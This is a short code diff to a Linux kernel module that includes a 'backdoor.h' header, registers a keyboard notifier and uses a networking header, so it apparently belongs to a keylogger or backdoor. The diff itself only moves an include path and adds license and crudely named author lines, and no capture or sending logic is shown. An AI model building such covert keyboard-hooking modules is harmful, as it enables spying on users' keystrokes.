@@ -7,8 +7,7 @@
 #include <linux/delay.h>
 
 #include "backdoor.h"
-#include "utils/networking.h"
-
+#include "networking.h"
 static struct notifier_block keyboard_notifier_block = {
     .notifier_call = keyboard_notifier_callback,
 };
@@ -87,3 +86,5 @@ static void __exit keyboard_module_exit(void) {
 
 module_init(keyboard_module_init);
 module_exit(keyboard_module_exit);
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("penis");
